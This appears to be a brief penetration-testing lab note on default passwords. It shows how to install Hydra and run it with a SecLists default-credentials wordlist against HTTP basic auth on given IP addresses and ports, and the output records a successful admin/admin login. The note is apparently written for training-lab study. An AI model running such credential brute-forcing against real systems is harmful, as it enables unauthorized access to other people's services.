# Default Passwords

## Hydra
apt install hydra -y
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /

## LAB

83.136.250.104:48522

hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 83.136.250.104 -s 48522 http-get /

[48522][http-get] host: 83.136.250.104   login: admin   password: admin
